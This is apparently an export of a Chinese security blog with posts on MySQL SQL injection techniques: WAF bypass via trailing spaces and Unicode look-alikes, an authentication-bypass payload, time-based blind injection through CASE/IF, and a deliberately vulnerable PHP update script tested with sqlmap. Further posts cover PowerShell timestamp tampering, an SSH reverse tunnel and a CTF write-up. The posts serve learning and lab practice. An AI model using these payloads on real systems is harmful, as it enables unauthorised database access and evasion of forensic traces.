<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="keyword">user</span> name <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="string">&#x27;1d&#x27;</span><span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span> name             <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span> root             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> root             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> root             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> debian<span class="operator">-</span>sys<span class="operator">-</span>maint <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> root             <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="number">5</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span>, <span class="number">1</span> warning (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure>
<p><img src="/images/a48c6f66869841123aefa80a9fcd1a231ee6d904.png" alt="这个我在本地实验没成功"></p>
<p>##尾空格<br>MySQL等号对字符尾部的空格做忽视的处理，所以我们可以构造一个<code>&#39;abc&#39;=&#39;abc [space]</code>的效果，绕过某些特定串整体检查的<code>WAF</code>，不过相对来说，这个也比较鸡肋，因为很少有用的字符串直接对比来过滤某些敏感串的，直接用<code>trim</code>函数来避免。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;root       &#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">user</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span> root <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> root <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> root <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> root <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>##UNICODE字符集相似字符<br>Unicode字符集所有字符：<code>[点我](http://unicode-table.com/cn/ &quot;点我&quot;)</code><br>其中有些相似字符，比如下面这个与<code>a</code>相似。<br><img src="/images/d97b39cccad21a123eb8a257162374b269a0bd06.png" alt="7.png"><br>这会造成什么后果呢？</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="string">&#x27;a&#x27;</span><span class="operator">=</span><span class="string">&#x27;à&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">user</span>             <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span> root             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> root             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> root             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> debian<span class="operator">-</span>sys<span class="operator">-</span>maint <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> root             <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="number">5</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>看到了吧，MySQL的等号认为这些相似字符也是相等的，这样的话，我们就可以完全绕过对敏感串的过滤，前提是在<code>UTF8</code>编码下。</p>
<p>##新型万能密码<br><code>username=&#39;admin&#39;=&#39;&#39;</code><br>这是有2个等号，然后计算顺序<code>从左到右</code>。<br>先计算<code>username=&#39;admin&#39;</code>,<br>如果没有这个记录，则返回<code>false</code>,<br>然后计算<code>false=&#39;&#39;</code>,<br>结果就成了<code>true</code>了，<br>所以这个就相当于<code>where 1</code>，<br>达到了万能密码的效果。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="keyword">Empty</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;admin&#x27;</span><span class="operator">=</span><span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">user</span>             <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span> root             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> root             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> root             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> debian<span class="operator">-</span>sys<span class="operator">-</span>maint <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> root             <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="number">5</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>sqli</category>
      </categories>
  </entry>
  <entry>
    <title>SQL Insert into 注入</title>
    <url>/sqli/SQL%20Insert%20into%20%E6%B3%A8%E5%85%A5.html</url>
    <content><![CDATA[<p>使用sqlmap会使测试数据库中插入大量测试语句，而且产生大量日志，下面的方法利用mysql在<code>scalar subquiry</code>将<code>insert into</code>类型的注入转换为<code>Time-based blind</code>注入。</p>
<p>先看执行效果：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">select (select <span class="keyword">case</span> when 1=1 <span class="keyword">then</span> <span class="built_in">sleep</span>(1) <span class="keyword">else</span> <span class="string">&#x27;hello&#x27;</span> end from ((select 1 as a) union (select 2 as a)) <span class="built_in">test</span>);</span></span><br><span class="line">ERROR 1242 (21000): Subquery returns more than 1 row</span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">select (select <span class="keyword">case</span> when 1=2 <span class="keyword">then</span> <span class="built_in">sleep</span>(1) <span class="keyword">else</span> <span class="string">&#x27;hello&#x27;</span> end from ((select 1 as a) union (select 2 as a)) <span class="built_in">test</span>);</span></span><br><span class="line">ERROR 1242 (21000): Subquery returns more than 1 row</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>先看语句：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> (</span><br><span class="line">	<span class="keyword">select</span> <span class="keyword">case</span></span><br><span class="line">		<span class="keyword">when</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">		<span class="keyword">then</span> sleep(<span class="number">3</span>)</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		<span class="string">&#x27;hello&#x27;</span></span><br><span class="line">		<span class="keyword">end</span></span><br><span class="line">	<span class="keyword">from</span></span><br><span class="line">		(</span><br><span class="line">			(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">as</span> a)</span><br><span class="line">			<span class="keyword">union</span></span><br><span class="line">			(<span class="keyword">select</span> <span class="number">2</span> <span class="keyword">as</span> a)</span><br><span class="line">		)</span><br><span class="line">test);</span><br></pre></td></tr></table></figure>

<p>经过实验可得，如果<code>from</code>后面，<code>union</code>前后的两个<code>select</code>子查询使用相同的值，则会返回一列，故不会出错，从而导致<code>insert into</code>语句成功执行；当两个值不相同时，无论判断成功与否，都会导致<code>insert into</code>语句执行失败，从而转化为时间盲注。</p>
<p>参考：<br><a href="http://www.mathyvanhoef.com/2011/10/exploiting-insert-into-sql-injections.html">http://www.mathyvanhoef.com/2011/10/exploiting-insert-into-sql-injections.html</a><br><a href="https://dev.mysql.com/doc/refman/5.6/en/scalar-subqueries.html">https://dev.mysql.com/doc/refman/5.6/en/scalar-subqueries.html</a></p>
]]></content>
      <categories>
        <category>sqli</category>
      </categories>
  </entry>
  <entry>
    <title>PowerShell 笔记 [不断更新]</title>
    <url>/pentest/PowerShell%20%E7%AC%94%E8%AE%B0%20%5B%E4%B8%8D%E6%96%AD%E6%9B%B4%E6%96%B0%5D.html</url>
    <content><![CDATA[<h1 id="日常用到的powershell命令及脚本"><a href="#日常用到的powershell命令及脚本" class="headerlink" title="日常用到的powershell命令及脚本"></a>日常用到的powershell命令及脚本</h1><h2 id="更改文件夹的“修改时间”"><a href="#更改文件夹的“修改时间”" class="headerlink" title="更改文件夹的“修改时间”"></a>更改文件夹的“修改时间”</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="built_in">Get-Date</span> <span class="string">&quot;02/09/2013 4:59 PM&quot;</span></span><br><span class="line"><span class="variable">$d</span> = [<span class="type">system.io.directoryinfo</span>]<span class="string">&quot;C:\Users\user\Documents\CV&quot;</span></span><br><span class="line"><span class="variable">$d</span>.LastWriteTime = <span class="variable">$a</span></span><br></pre></td></tr></table></figure>

<h2 id="更改文件夹下所有文件“修改时间”"><a href="#更改文件夹下所有文件“修改时间”" class="headerlink" title="更改文件夹下所有文件“修改时间”"></a>更改文件夹下所有文件“修改时间”</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="built_in">Get-Date</span> <span class="string">&quot;2/13/2007 8:00 AM&quot;</span></span><br><span class="line"><span class="variable">$b</span> = <span class="built_in">Get-ChildItem</span> <span class="string">&quot;C:\Scripts&quot;</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$i</span> <span class="keyword">in</span> <span class="variable">$b</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$i</span>.LastWriteTime = <span class="variable">$a</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="variable">$a</span>.AddMinutes(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pentest</category>
      </categories>
  </entry>
  <entry>
    <title>MySql中的IF表达式</title>
    <url>/sqli/SQL%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%9A%84IF%E8%A1%A8%E8%BE%BE%E5%BC%8F.html</url>
    <content><![CDATA[<p>[TOC]</p>
<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><ol>
<li>一般为SQL盲注或时间注入在时候。</li>
<li>逗号<code>,</code>没有被过滤的情况下。<blockquote>
<p>如果注入点过滤了逗号<code>,</code>，可用CASE表达式绕过，参考<a href="http://m0nst3r.me/sqli/95.html" title="SQL注入中的CASE表达式">SQL注入中的CASE表达式</a></p>
</blockquote>
</li>
</ol>
<h2 id="MySql中的IF表达式"><a href="#MySql中的IF表达式" class="headerlink" title="MySql中的IF表达式"></a>MySql中的IF表达式</h2><h3 id="定义参考"><a href="#定义参考" class="headerlink" title="定义参考"></a>定义参考</h3><ol>
<li><p>官方参考：<a href="https://dev.mysql.com/doc/refman/5.7/en/control-flow-functions.html#function_if" title="MYSQL IF表达式参考">MYSQL IF表达式参考</a></p>
</li>
<li><p>语法</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">IF(expr1,expr2,expr3)</span><br></pre></td></tr></table></figure>
</li>
<li><p>关于返回值<br>  3.1 如果<code>expr1</code>不等于<code>0</code>，且<code>expr1</code>不等于<code>NULL</code>，则整个表达式的结果为<code>expr2</code>，否则为<code>expr3</code>。<br>  3.2 如果<code>expr1</code>，<code>expr2</code>中只有一个为<code>NULL</code>,则整个<code>IF()</code>表达式的返回值类型为那个<code>非NULL</code>表达式的类型。<br>  3.3 默认的返回值遵守以下规则：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果`expr2`或者`expr3`会产生一个`string`，则返回值为`string`;</span><br><span class="line">如果`expr2`和`expr3`都是`string`，且任何其中一个是大小写敏感的，则返回值也是大小写敏感的；</span><br><span class="line">如果`expr3`或者`expr3`产生一个浮点类型的值，则结果为一个浮点类型的值；</span><br><span class="line">如果`expr2`或者`expr3`会产生一个整数，则结果为一个整数。</span><br></pre></td></tr></table></figure></li>
</ol>
<p>##举例</p>
<pre>
mysql> select if(1<0,sleep(5),sleep(2)); 0 1 +---------------------------+ | if(1<0,sleep(5),sleep(2)) row in set (2.00 sec) < pre></0,sleep(5),sleep(2));></pre>]]></content>
      <categories>
        <category>sqli</category>
      </categories>
  </entry>
  <entry>
    <title>SSH Tunnel</title>
    <url>/pentest/SSH-Tunnel.html</url>
    <content><![CDATA[<p>至于为什么要做这个，你们都懂的。</p>
<p>SSHD那边的设置：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">/etc/ssh/sshd_config</span></span><br><span class="line">GatewayPorts yes</span><br><span class="line">AllowTcpForwarding yes</span><br><span class="line">PermitRootLogin yes</span><br><span class="line">PasswordAuthentication yes</span><br></pre></td></tr></table></figure>

<p>一个ssh_tunnel有脚本：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">if [ -n &quot;$1&quot; ]</span><br><span class="line">then</span><br><span class="line">echo 0.0.0.0:$1&quot;--&lt;&gt;--&quot;ssh_server:$1</span><br><span class="line">ssh -C -g -i xxx.pem root@VPS -R $1:127.0.0.1:$1</span><br><span class="line">else</span><br><span class="line">echo 0.0.0.0:53&quot;--&lt;&gt;--&quot;ssh_server:53</span><br><span class="line">ssh -C -g -i xxx.pem root@VPS -R 53:127.0.0.1:53</span><br><span class="line">fi</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pentest</category>
      </categories>
  </entry>
  <entry>
    <title>MySql中的CASE表达式</title>
    <url>/sqli/SQL%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%9A%84CASE%E8%A1%A8%E8%BE%BE%E5%BC%8F.html</url>
    <content><![CDATA[<p>[TOC]</p>
<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>在做CTF的时候，发现一个时间盲注，一时间忘记怎么手工，不能忍，果断搜索了一波。</p>
<h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><ol>
<li>盲注</li>
<li>绕过过滤逗号<code>,</code>的注入点</li>
</ol>
<h2 id="MySql中的CASE表达式"><a href="#MySql中的CASE表达式" class="headerlink" title="MySql中的CASE表达式"></a>MySql中的CASE表达式</h2><h3 id="定义参考"><a href="#定义参考" class="headerlink" title="定义参考"></a>定义参考</h3><ol>
<li><p>先附上官方参考：<a href="https://dev.mysql.com/doc/refman/5.7/en/control-flow-functions.html" title="MySQL CASE 表达式参考">MySQL CASE 表达式参考</a></p>
</li>
<li><p>CASE表达式的两种写法</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CASE</span> <span class="keyword">value</span> <span class="keyword">WHEN</span> [compare_value] <span class="keyword">THEN</span> <span class="keyword">result</span> [<span class="keyword">WHEN</span> [compare_value] <span class="keyword">THEN</span> <span class="keyword">result</span> ...] [<span class="keyword">ELSE</span> <span class="keyword">result</span>] <span class="keyword">END</span></span><br><span class="line"><span class="keyword">CASE</span> <span class="keyword">WHEN</span> [<span class="keyword">condition</span>] <span class="keyword">THEN</span> <span class="keyword">result</span> [<span class="keyword">WHEN</span> [<span class="keyword">condition</span>] <span class="keyword">THEN</span> <span class="keyword">result</span> ...] [<span class="keyword">ELSE</span> <span class="keyword">result</span>] <span class="keyword">END</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h2><ol>
<li>第一种语法<pre>
 mysql> select case 1 when 1 then 'one' end;
 +------------------------------+
 | case 1 when 1 then 'one' end |
 +------------------------------+
 | one                          |
 +------------------------------+
 1 row in set (0.04 sec)

 mysql> select case 1 when 1=1 then sleep(5) end;
 +-----------------------------------+
 | case 1 when 1=1 then sleep(5) end |
 +-----------------------------------+
 |                                 0 |
 +-----------------------------------+
 1 row in set (5.00 sec)
 
 mysql> select case 1 when 1=2 then sleep(5) when 1=1 then sleep(2) end;
 +----------------------------------------------------------+
 | case 1 when 1=2 then sleep(5) when 1=1 then sleep(2) end |
 +----------------------------------------------------------+
 |                                                        0 |
 +----------------------------------------------------------+
 1 row in set (2.00 sec)</pre></li>
</ol>
<p></p>
<ol start="2">
<li>第二种用法<pre>
mysql> select case when 1=1 then sleep(2) else sleep(5) end;
+-----------------------------------------------+
| case when 1=1 then sleep(2) else sleep(5) end |
+-----------------------------------------------+
|                                             0 |
+-----------------------------------------------+
1 row in set (2.00 sec)

 mysql> select case when 1=2 then sleep(2) else sleep(5) end;</pre></li>
</ol>
<p>+———————————————–+<br>| case when 1&#x3D;2 then sleep(2) else sleep(5) end |<br>+———————————————–+<br>|                                             0 |<br>+———————————————–+<br>1 row in set (5.00 sec)<br></p>
]]></content>
      <categories>
        <category>sqli</category>
      </categories>
  </entry>
  <entry>
    <title>SUCTF Anonymous WriteUp</title>
    <url>/web-sec/CTF/SUCTF%20Anonymous%20WriteUp.html</url>
    <content><![CDATA[<h2 id="source-code"><a href="#source-code" class="headerlink" title="source code"></a>source code</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$MY</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&quot;&quot;</span>,<span class="string">&quot;die(`cat flag.php`);&quot;</span>);</span><br><span class="line"><span class="variable">$hash</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="number">32</span>));</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;function SUCTF_<span class="subst">$hash</span>()&#123;&quot;</span></span><br><span class="line">    .<span class="string">&quot;global \$MY;&quot;</span></span><br><span class="line">    .<span class="string">&quot;\$MY();&quot;</span></span><br><span class="line">    .<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;func_name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_GET</span>[<span class="string">&quot;func_name&quot;</span>]();</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>匿名函数并不是真的没有名字。。。<br><code>%00lambda_%d</code></p>
<p><img src="/images/f1efe6696754ed6c6f1a78a6eaf970d0047b1a21.png"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.jianshu.com/p/19e3ee990cb7">https://www.jianshu.com/p/19e3ee990cb7</a><br><a href="https://github.com/orangetw/My-CTF-Web-Challenges">https://github.com/orangetw/My-CTF-Web-Challenges</a><br><a href="http://php.net/manual/zh/book.phar.php">http://php.net/manual/zh/book.phar.php</a><br><a href="http://blog.jobbole.com/91920/">http://blog.jobbole.com/91920/</a><br><a href="https://yq.aliyun.com/ziliao/55320">https://yq.aliyun.com/ziliao/55320</a><br><a href="https://www.zhihu.com/question/23786410">https://www.zhihu.com/question/23786410</a></p>
]]></content>
      <categories>
        <category>web-sec</category>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>angr符号执行练习 angr_ctf</title>
    <url>/re/pwn/angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E7%BB%83%E4%B9%A0-angr-ctf.html</url>
    <content><![CDATA[<h1 id="angr-ctf"><a href="#angr-ctf" class="headerlink" title="angr_ctf"></a>angr_ctf</h1><p>一个练习angr用法的题目，里面有说明指导。<code>https://github.com/jakespringer/angr_ctf/</code></p>
<p>因为国内相关资料太少了，所以做成了视频，更新在B站。</p>
<blockquote>
<p>刚开始接触相关内容，视频只能算抛砖引砖，表达能力与水平比较低，轻喷</p>
</blockquote>
<p>BiliBili 播放列表，还在持续更新<br><a href="https://space.bilibili.com/386563875/channel/detail?cid=109932">https://space.bilibili.com/386563875/channel/detail?cid=109932</a></p>
<p>QQ群：951587491<br>群内还是有大神的。</p>
<p><img src="/re/pwn/angr%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E7%BB%83%E4%B9%A0-angr-ctf/2020-04-07-18-34-36.png"></p>
]]></content>
      <categories>
        <category>re</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>angr</tag>
        <tag>angr_ctf</tag>
        <tag>符号执行</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入学习——update注入</title>
    <url>/sqli/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94update%E6%B3%A8%E5%85%A5.html</url>
    <content><![CDATA[<p>[TOC]<br>##起因<br>update操作在数据库中用来更改数据，如果遇到这样的注入点，胡乱测试一通可能会引起不可恢复的错误，所以本地搭建环境写了个简单脚本测试下sqlmap是怎么注入update语句的注入点的。</p>
<p>##准备环境<br>###数据库设置<br>创建简单的表并插入数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> `atable` (</span><br><span class="line">  `userid` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  `truename` <span class="type">varchar</span>(<span class="number">32</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `email` <span class="type">varchar</span>(<span class="number">32</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`userid`)</span><br><span class="line">) ENGINE<span class="operator">=</span>MyISAM  <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>latin1 AUTO_INCREMENT<span class="operator">=</span><span class="number">3</span> ;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">INSERT</span> <span class="keyword">INTO</span> `atable` (`userid`, `truename`, `email`) <span class="keyword">VALUES</span></span><br><span class="line">(<span class="number">1</span>, <span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;123123&#x27;</span>),</span><br><span class="line">(<span class="number">2</span>, <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;111&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>###有漏洞的PHP程序<br>创建有漏洞的php程序（<code>sqli-update.php</code>）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mysql_connect</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">mysql_select_db</span>(<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="string">&#x27;select names utf8&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>)) &#123;</span><br><span class="line"><span class="variable">$truename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;truename&#x27;</span>];</span><br><span class="line"><span class="variable">$email</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$truename</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$email</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE atable set `email`=&#x27;<span class="subst">$email</span>&#x27; where `truename`=&#x27;<span class="subst">$truename</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>)) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;Success!&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Failed!&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">mysql_error</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&#x27;select * from atable&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$rows</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$rows</span>)) &#123;</span><br><span class="line">	<span class="title function_ invoke__">var_dump</span>(<span class="variable">$row</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;SQLi UPDATE&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&#x27;#&#x27;</span> method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">用户名&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;truename&quot;</span>&gt;&lt;br/&gt;</span><br><span class="line">邮  箱&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;email&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;修改&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>用<code>sqlmap</code>跑下加上<code>v 3</code>查看过程<br>  命令如下：<code>sqlmap -u &quot;http://192.168.1.110/test/sqli-update.php?truename=test&amp;email=123123&amp;submit=修改#&quot; -p truename -v 3</code></li>
</ol>
<p>结果：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET parameter &#x27;truename&#x27; is vulnerable. Do you want to keep testing the others (if any)? [y/N] </span><br><span class="line">sqlmap identified the following injection point(s) with a total of 436 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: truename (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause</span><br><span class="line">    Payload: truename=test&#x27; RLIKE (SELECT (CASE WHEN (1387=1387) THEN 0x74657374 ELSE 0x28 END))-- yLoM&amp;email=123123&amp;submit=修改</span><br><span class="line">    Vector: RLIKE (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 0x28 END))</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: truename=test&#x27; AND (SELECT 5950 FROM(SELECT COUNT(*),CONCAT(0x71707a7171,(SELECT (ELT(5950=5950,1))),0x7176707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- sDHA&amp;email=123123&amp;submit=修改</span><br><span class="line">    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT(&#x27;[DELIMITER_START]&#x27;,([QUERY]),&#x27;[DELIMITER_STOP]&#x27;,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</span><br><span class="line"></span><br><span class="line">    Type: AND/OR time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind</span><br><span class="line">    Payload: truename=test&#x27; AND SLEEP(5)-- gzuL&amp;email=123123&amp;submit=修改</span><br><span class="line">    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])</span><br><span class="line">	---</span><br><span class="line">	[22:09:35] [INFO] the back-end DBMS is MySQL</span><br><span class="line">	web server operating system: 